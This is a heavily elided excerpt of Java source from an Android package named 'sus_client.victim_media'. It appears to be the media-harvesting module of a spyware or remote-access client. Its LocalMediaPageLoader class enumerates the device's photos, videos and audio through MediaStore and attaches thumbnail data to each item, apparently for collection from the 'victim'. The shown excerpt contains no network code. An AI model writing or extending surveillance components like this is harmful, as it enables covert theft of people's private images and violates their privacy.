package com.android.sus_client.victim_media;
...
import com.android.sus_client.victim_media.config.PictureConfig;
import com.android.sus_client.victim_media.config.PictureMimeType;
import com.android.sus_client.victim_media.config.SelectMimeType;
...
import com.android.sus_client.victim_media.entity.MediaData;
import com.android.sus_client.victim_media.interfaces.OnQueryAllAlbumListener;
import com.android.sus_client.victim_media.interfaces.OnQueryDataResultListener;
import com.android.sus_client.victim_media.utils.FileSizeUnit;
...
import com.android.sus_client.victim_media.utils.SdkVersionUtils;
import com.android.sus_client.victim_media.utils.SortUtils;
import com.android.sus_client.victim_media.utils.ValueOf;
...
public final class LocalMediaPageLoader extends IBridgeMediaLoader {
                ...
                try {
                    ...
                    if (data != null) {
                        ...
                        if (bucketId == PictureConfig.ALL && page == 1) {
                            List<LocalMedia> list = SandboxFileLoader.loadInAppSandboxFile(getContext(), getConfig());
                            if (list != null) {
                                result.addAll(list);
                    ...
                    if (data != null) {
                        ...
                        if (count > 0) {
                            if (isWithAllQuery()) {
                                ...
                                if (data.moveToFirst()) {
                                    ...
                                    do {
                                        ...
                                        long id = data.getLong(data.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID));
                                        String path = MediaUtils.getRealPathUri(id, mimeType);
                                        mediaFolder.setFolderName(bucketDisplayName);
                                        mediaFolder.setFolderTotalNum(ValueOf.toInt(size));
                                        mediaFolder.setFirstImagePath(path);
                                        mediaFolder.setFirstImageData(MediaUtils.getAlbumThumbnailData(getContext(), mimeType, path));
                                ...
                                do {
                                    ...
                                    mediaFolder.setFirstImageData(MediaUtils.getAlbumThumbnailData(getContext(), mimeType, url));
                                    mediaFolder.setFolderName(bucketDisplayName);
                                    mediaFolder.setFirstMimeType(mimeType);
                            ...
                            LocalMediaFolder selfFolder = SandboxFileLoader
                                    .loadInAppSandboxFolderFile(getContext(), getConfig());
                            if (selfFolder != null) {
                                ...
                                if (data.moveToFirst()) {
                                    String url = SdkVersionUtils.isQ() ? getFirstUri(data) : getFirstUrl(data);
                                    String mimeType = getFirstCoverMimeType(data);
                                    allMediaFolder.setFirstImagePath(url);
                                    allMediaFolder.setFirstImageData(MediaUtils.getAlbumThumbnailData(getContext(), mimeType, url));
                                    allMediaFolder.setFirstMimeType(mimeType);
                                    long lastModified2;
                                    ...
                                    if (lastModified > lastModified2) {
                                        ...
                                        allMediaFolder.setFirstImageData(MediaUtils.getAlbumThumbnailData(getContext(), selfFolder.getFirstMimeType(), selfFolder.getFirstImagePath()));
                            ...
                            String folderName = getConfig().chooseMode == SelectMimeType.ofAudio()
                                    ? "All audio" : "CameraRoll";
    ...
    private void synchronousFirstCover(List<LocalMediaFolder> mediaFolders) {
        for (int i = 0; i < mediaFolders.size(); i++) {
            ...
            //mediaFolder.setFirstImageData(MediaUtils.getAlbumThumbnailData(getContext(), mediaFolder.getFirstMimeType(), mediaFolder.getFirstImagePath()));
        }
    }
    ...
    protected LocalMedia parseLocalMedia(Cursor data, boolean isUsePool) {
        ...
        if (PictureMimeType.isHasAudio(mimeType)) {
            ...
            thumbnailData = MediaUtils.getVideoThumbnailData(getContext(), url);
        } else {
            thumbnailData = MediaUtils.getImageThumbnailData(getContext(), url);
        }

        LocalMedia media = isUsePool ? LocalMedia.obtain() : LocalMedia.create();
        media.setId(id);
        media.setBucketId(bucketId);
        media.setData(thumbnailData);
        media.setPath(url);
